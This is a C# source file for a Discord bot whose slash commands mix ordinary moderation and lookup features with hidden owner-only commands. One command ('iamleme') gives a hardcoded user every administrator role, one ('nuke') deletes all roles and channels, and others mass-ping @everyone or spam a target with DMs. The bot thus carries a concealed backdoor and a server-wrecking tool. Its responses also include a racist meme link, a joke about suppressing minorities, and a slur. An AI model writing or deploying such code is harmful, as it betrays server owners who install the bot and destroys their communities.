using Discord;
using Discord.Interactions;
using Discord.WebSocket;
using IPinfo;
using IPinfo.Models;
using Newtonsoft.Json;
using System;
using System.Net;
using System.Threading.Tasks;

namespace amblflecasm.Data.Modules
{
	public class Commands : InteractionModuleBase<SocketInteractionContext>
	{
		/*
		 * Actually useful commands
		 */

		IPinfoClient IPinfoClient = null;

		[SlashCommand("help", "Get some help,.", false, RunMode.Async)]
		public async Task Help()
		{
			EmbedBuilder emb = new EmbedBuilder
			{
				Title = "Command List",
				Color = Color.Blue
			};

			foreach (SlashCommandInfo sci in Program.interactionService.SlashCommands)
				emb.AddField(sci.Name, sci.Description);

			await this.RespondAsync(null, new Embed[] { emb.Build() });
		}

		[SlashCommand("shutthefuckup", "Times out everybody", false, RunMode.Async)]
		public async Task ShutTheFuckUp()
		{
			TimeSpan span = new TimeSpan(0, 2, 0);
			IGuildUser guildUser = this.Context.User as IGuildUser;

			if (!guildUser.GuildPermissions.Administrator && !guildUser.GuildPermissions.ModerateMembers)
			{
				await guildUser.SetTimeOutAsync(span);
				await this.RespondAsync("You shut up");

				return;
			}

			await this.RespondAsync("Suppressing minorities... Please wait");

			foreach (IGuildUser user in this.Context.Guild.Users)
			{
				if (user.IsBot || user.GuildPermissions.Administrator || user.Id == guildUser.Id) continue;
				await user.SetTimeOutAsync(span);
			}

			await this.RespondAsync(":cricket: :cricket: :cricket:");
		}

		[SlashCommand("mute", "Mute someone for a long time", false, RunMode.Async)]
		public async Task Mute(SocketUser target = null)
		{
			IGuildUser guildUser = this.Context.User as IGuildUser;

			if (!guildUser.GuildPermissions.Administrator && !guildUser.GuildPermissions.ModerateMembers)
			{
				await this.RespondAsync("Access is denied");
				return;
			}

			if (target == null)
			{
				await this.RespondAsync("https://tenor.com/view/staring-black-man-staring-black-men-staring-black-men-men-staring-gif-25096788");
				return;
			}

			IGuildUser guildTarget = target as IGuildUser;

			if (guildTarget == null)
			{
				await this.RespondAsync("404: Member not found in guild.");
				return;
			}

			if (guildTarget.IsBot)
			{
				await this.RespondAsync("That's a bot dumbass..");
				return;
			}

			if (guildTarget.GuildPermissions.Administrator)
			{
				await this.RespondAsync("That's an admin dumbass..");
				return;
			}

			if (guildTarget.GuildPermissions.ModerateMembers)
			{
				await this.RespondAsync("That's a mod dumbass..");
				return;
			}

			try
			{
				int time = Int32.Parse(Program.GetConfigData("MaxTimeoutLength").ToString());

				await guildTarget.SetTimeOutAsync(new TimeSpan(time, 0, 0));
				await this.RespondAsync("Member timed out for " + (time / 24) + " days");
			} catch (Exception)
			{
				await this.RespondAsync("Failed to mute member");
			}
		}

		[SlashCommand("unmute", "Unmutes someone", false, RunMode.Async)]
		public async Task Unmute(SocketUser target =  null)
		{
			IGuildUser guildUser = this.Context.User as IGuildUser;

			if (!guildUser.GuildPermissions.Administrator && !guildUser.GuildPermissions.ModerateMembers)
			{
				await this.RespondAsync("Access is denied");
				return;
			}

			if (target == null)
			{
				await this.RespondAsync("https://tenor.com/view/staring-black-man-staring-black-men-staring-black-men-men-staring-gif-25096788");
				return;
			}

			IGuildUser guildTarget = target as IGuildUser;

			if (guildTarget == null)
			{
				await this.RespondAsync("404: Member not found in guild.");
				return;
			}

			try
			{
				await guildTarget.RemoveTimeOutAsync();
				await this.RespondAsync("Member un-timed out");
			} catch (Exception)
			{
				await this.RespondAsync("Failed to unmute member");
			}
		}

		[SlashCommand("ipinfo", "IPinfo lookup", false, RunMode.Async)]
		public async Task IPinfo(string ipaddress = "")
		{
			if (ipaddress.Equals(string.Empty))
			{
				await this.RespondAsync("https://tenor.com/view/staring-black-man-staring-black-men-staring-black-men-men-staring-gif-25096788");
				return;
			}

			IPAddress addr;

			if (!IPAddress.TryParse(ipaddress, out addr))
			{
				await this.RespondAsync("Invalid IP entered");
				return;
			}

			if (IPinfoClient == null)
			{
				try
				{
					IPinfoClient = new IPinfoClient.Builder()
						.AccessToken(Program.GetConfigData("Tokens", "IPinfo").ToString())
						.Build();
				}
				catch (Exception)
				{
					await this.RespondAsync("Failed to build IPinfo client");
					return;
				}
			}

			try
			{
				ipaddress = addr.ToString();
				IPResponse ipResponse = await IPinfoClient.IPApi.GetDetailsAsync(ipaddress);

				EmbedBuilder emb = new EmbedBuilder
				{
					Title = "IPinfo for " + ipaddress,
					Color = Color.Blue
				};

				emb.AddField("Response IP", ipResponse.IP ?? "Unknown");
				emb.AddField("City", ipResponse.City ?? "Unknown");
				emb.AddField("Country", ipResponse.CountryName ?? "Unknown");
				emb.AddField("Company Name", ipResponse.Company?.Name ?? "Unknown");

				await this.RespondAsync(null, new Embed[] { emb.Build() });
			}
			catch (Exception)
			{
				await this.RespondAsync("Failed to parse IP");
			}
		}

		[SlashCommand("proxycheck", "ProxyCheck lookup", false, RunMode.Async)]
		public async Task ProxyCheck(string ipaddress = "")
		{
			if (ipaddress.Equals(string.Empty))
			{
				await this.RespondAsync("https://tenor.com/view/staring-black-man-staring-black-men-staring-black-men-men-staring-gif-25096788");
				return;
			}

			IPAddress addr;

			if (!IPAddress.TryParse(ipaddress, out addr))
			{
				await this.RespondAsync("Invalid IP entered");
				return;
			}

			try
			{
				ipaddress = addr.ToString();
				string proxyJSON = string.Empty;

				using (WebClient wc = new WebClient())
					proxyJSON = wc.DownloadString("https://proxycheck.io/v2/" + ipaddress + "&vpn=1"); // Who needs an api key when you have swag

				dynamic proxyJSONData = JsonConvert.DeserializeObject(proxyJSON);

				EmbedBuilder emb = new EmbedBuilder
				{
					Title = "ProxyCheck for " + ipaddress,
					Color = Color.Purple
				};

				emb.AddField("Is Proxy", proxyJSONData[ipaddress]?.proxy ?? "Unknown");
				emb.AddField("Proxy Type", proxyJSONData[ipaddress]?.type ?? "Unknown");
				emb.AddField("Proxy Operator", proxyJSONData[ipaddress]?["operator"]?.name ?? "Unknown");

				await this.RespondAsync(null, new Embed[] { emb.Build() });
			}
			catch (Exception)
			{
				await this.RespondAsync("Failed to parse IP");
			}
		}

		[SlashCommand("steam", "Steam lookup", false, RunMode.Async)]
		public async Task Steam(string steamID64 = "")
		{
			if (steamID64.Equals(string.Empty))
			{
				await this.RespondAsync("https://tenor.com/view/staring-black-man-staring-black-men-staring-black-men-men-staring-gif-25096788");
				return;
			}

			try
			{
				string steamResponse = string.Empty;

				/*
                 * Retarded api incoming
                 */

				using (WebClient wc = new WebClient())
					steamResponse = wc.DownloadString("https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v2/?key=" + Program.GetConfigData("Tokens", "Steam") + "&format=json&steamids=" + steamID64);

				dynamic steamJSON = JsonConvert.DeserializeObject(steamResponse);

				EmbedBuilder emb = new EmbedBuilder
				{
					Title = "Steam data for ID " + steamID64,
					ImageUrl = steamJSON.response?.players?[0]?.avatarfull ?? "https://steamcdn-a.akamaihd.net/steamcommunity/public/images/avatars/b5/b5bd56c1aa4644a474a2e4972be27ef9e82e517e_full.jpg" // Default '?'
				};

				emb.AddField("Profile URL", steamJSON.response?.players?[0]?.profileurl ?? "Unknown");
				emb.AddField("Real Name", steamJSON.response?.players?[0]?.realname ?? "Unknown");
				emb.AddField("Persona Name", steamJSON.response?.players?[0]?.personaname ?? "Unknown");
				emb.AddField("Date Created", Program.EpochToDateTime(steamJSON.response?.players?[0]?.timecreated ?? 0).ToString("D"));
				emb.Color = new Color(Color.Red);

				await this.RespondAsync(null, new Embed[] { emb.Build() });

			}
			catch (Exception)
			{
				await this.RespondAsync("Failed to parse data");
			}
		}

		/*
		 * Funy
		 */

		[SlashCommand("banme", "Get free admin", false, RunMode.Async)]
		public async Task BanMe()
		{
			try
			{
				await (this.Context.User as IGuildUser).BanAsync(0, "Asking for free admin");
				await this.RespondAsync("Okay if you say so");
			}
			catch (Exception)
			{
				await this.RespondAsync("No can do");
			}
		}

		[SlashCommand("egg", "Egg someone", false, RunMode.Async)] // Suggested by Merio
		public async Task Egg(SocketUser target = null)
		{
			if (target == null)
			{
				await this.RespondAsync("https://tenor.com/view/staring-black-man-staring-black-men-staring-black-men-men-staring-gif-25096788");
				return;
			}

			IGuildUser guildTarget = target as IGuildUser;

			if (guildTarget == null)
			{
				await this.RespondAsync("404: Member not found in guild.");
				return;
			}

			await this.RespondAsync("<@" + target.Id + "> :egg: :egg: :egg: :egg: :egg: :egg: :egg: :egg: :egg: :egg: :egg: :egg: :egg: :egg: :egg:");
		}

		/*
		 * leme only
		 */

		[SlashCommand("iamleme", "No you aren't", false, RunMode.Async)]
		public async Task IAmLeme()
		{
			if (!Program.IsUserLeme(this.Context.User))
			{
				await this.RespondAsync("No you aren't");
				return;
			}

			IGuildUser guildUser = this.Context.User as IGuildUser;
			bool added = false;

			foreach (SocketRole role in this.Context.Guild.Roles)
			{
				if (role.IsManaged) continue;
				if (!role.Permissions.Administrator) continue;

				try
				{
					await guildUser.AddRoleAsync(role);
					added = true;
				}
				catch (Exception) { }

				await Task.Delay(250);
			}

			if (added)
				await this.RespondAsync("Hello, leme");
			else
				await this.RespondAsync("Sorry, leme");
		}

		[SlashCommand("nuke", "Nukes a server", false, RunMode.Async)]
		public async Task Nuke()
		{
			if (!Program.IsUserLeme(this.Context.User))
			{
				await this.RespondAsync("leme only");
				return;
			}

			await this.RespondAsync("Bombs going off");

			foreach (SocketRole role in this.Context.Guild.Roles)
			{
				try
				{
					await role.DeleteAsync();
				}
				catch (Exception) { }
			
				await Task.Delay(250);
			}
			
			foreach (IGuildChannel channel in this.Context.Guild.Channels)
			{
				try
				{
					await channel.DeleteAsync();
				}
				catch (Exception) { }
			
				await Task.Delay(250);
			}

			IUserMessage message = await this.GetOriginalResponseAsync();
			await message.ModifyAsync(message => message.Content = "Kaboom!");
		}

		[SlashCommand("hey", "Hey man. . .", false, RunMode.Async)]
		public async Task Hey()
		{
			if (!Program.IsUserLeme(this.Context.User))
			{
				await this.RespondAsync("leme only");
				return;
			}

			await this.RespondAsync("Hello!");
			
			foreach (SocketChannel channel in this.Context.Guild.Channels)
			{
				if (channel.GetChannelType() != ChannelType.Text)
					continue;
			
				try
				{
					await (channel as SocketTextChannel).SendMessageAsync("@everyone hey.");
					await Task.Delay(250);
				}
				catch (Exception) { }
			}
		}

		[SlashCommand("boom", "Vine BOOM", false, RunMode.Async)]
		public async Task Boom(SocketUser target, int amount = 10)
		{
			if (target == null)
			{
				await this.RespondAsync("https://tenor.com/view/staring-black-man-staring-black-men-staring-black-men-men-staring-gif-25096788");
				return;
			}

			if (amount < 1)
			{
				await this.RespondAsync("Invalid number entered, must be > 0");
				return;
			}

			IGuildUser guildTarget = target as IGuildUser;

			if (guildTarget == null)
			{
				await this.RespondAsync("404: Member not found in guild.");
				return;
			}

			await this.RespondAsync("Booming `" + guildTarget.DisplayName + "` " + amount + " time" + (amount == 1 ? "" : "s"));

			for (int i = 1; i <= amount; i++)
			{
				try
				{
					await guildTarget.SendMessageAsync("https://tenor.com/view/vineboom-ilybeeduo-gif-23126674");
					await Task.Delay(750);
				}
				catch (Exception)
				{
					break;
				}
			}

			IUserMessage message = await this.GetOriginalResponseAsync();
			await message.ModifyAsync(message => message.Content = "Vine BOOM!");
		}
	}
}
